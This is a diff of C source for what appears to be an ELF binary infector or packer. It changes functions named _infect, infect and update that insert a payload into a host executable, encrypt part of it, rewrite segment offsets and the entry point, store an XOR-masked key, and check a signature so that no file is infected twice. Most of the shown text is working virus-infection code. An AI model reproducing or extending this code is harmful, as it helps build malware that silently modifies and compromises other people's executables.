@@ -68,7 +68,7 @@ static void _insert_zeros(char **s, size_t *n, size_t pos, size_t add){
 	*n = (*n) + add;
 }
 
-void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt, char *s, size_t sn){
+void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt, char *s, size_t sn, bool compressed){
 	//add a few information about himself
 	Elf64_Ehdr *bh = (void*)b;
 	size_t pos = 0/*elf_offset_entry(b, n)*/;
@@ -77,17 +77,12 @@ void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt,
 	p[0] = max(old_entry,entry) - min(old_entry,entry);
 	struct s_opt *p_opt = (struct s_opt*)(((char *)b+DATA+8));
 	*p_opt = opt;
-	//p[1] = entry - pos;
-	//printf("diff: %zx, size: %zx\n", entry - pos, n);
-	//p[2] = n;
-	//size_t ok = max(text_addr,entry) - min(text_addr,entry);
-	//p[3]=ok;
-	//p[4] = text_length;
-	//inserting KEY
+	p[2] = compressed;
 	p[3] = ((size_t*)key)[0];
 	p[4] = ((size_t*)key)[1];
 	*(unsigned char*)(p + 3) ^= 0b01110010;
-	encrypt((char*)(p+5), 15, (uint32_t*)key);
+	int c = FALSE;
+	encrypt((char*)(p+5), 15, (uint32_t*)key, &c);
 	get_sig(s, sn, n, (char*)(p + 7));
 }
 
@@ -118,14 +113,19 @@ static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, si
 	size_t oldn2 = *n;
 	char *olds2 = *s;
 	_insert(s, n, pos-1, b, bn);
-	encrypt(((*s) + pos + crypt_off), crypt_len, (uint32_t*)key);
+	//encryption
+	bool compressed = TRUE;
+	uint64_t changed = encrypt(((*s) + pos + crypt_off), crypt_len, (uint32_t*)key, &compressed);
 	//reset it
 	elf_shift_offset(*s, *n, pos, bn);
 	elf_update_flags_of_load_segments(*s, *n);
 	elf_change_size_last_load_segment(*s, *n, bn);
 	elf_set_off_entry(*s, *n, pos);
 	h = (void*)*s;
-	update((*s) + pos, bn, old_entry, h->e_entry, opt, *s, *n);
+	ph = (*(void**)s) + h->e_phoff;
+	//TODO: check not already inf
+	//ph[x].p_memsz += changed;
+	update((*s) + pos, bn, old_entry, h->e_entry, opt, *s, *n, compressed);
 	ffree(olds2, oldn2);
 	if (olds)
 		ffree(olds, oldn);
@@ -145,25 +145,9 @@ int check_already_packed(char *s, size_t n, size_t virus_len){
 	if (get_sig(s, n, virus_len, sig) == FALSE)
 		return TRUE;
 	size_t *p = ((size_t *)(char*)(s + entry + DATA));
-	//print(sig);
-	//print(p + 7);
-	//print("\n");
 	if (sncmp((char*)(p+7), sig, sig_len) == 0)
 		return fail("already packed");
 	return TRUE;
-}
-
-char *debug_name(char *fname){
-	char *s = ft_malloc(slen(fname)+5);
-	int x;
-	for (x = 0; fname[x]; x++)
-		s[x] = fname[x];
-	s[x] = '.';
-	s[x+1] = 'l';
-	s[x+2] = 'o';
-	s[x+3] = 'l';
-	s[x+4] = '\0';
-	return s;
 }
 
 int infect(char *fname, char *outname, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt){
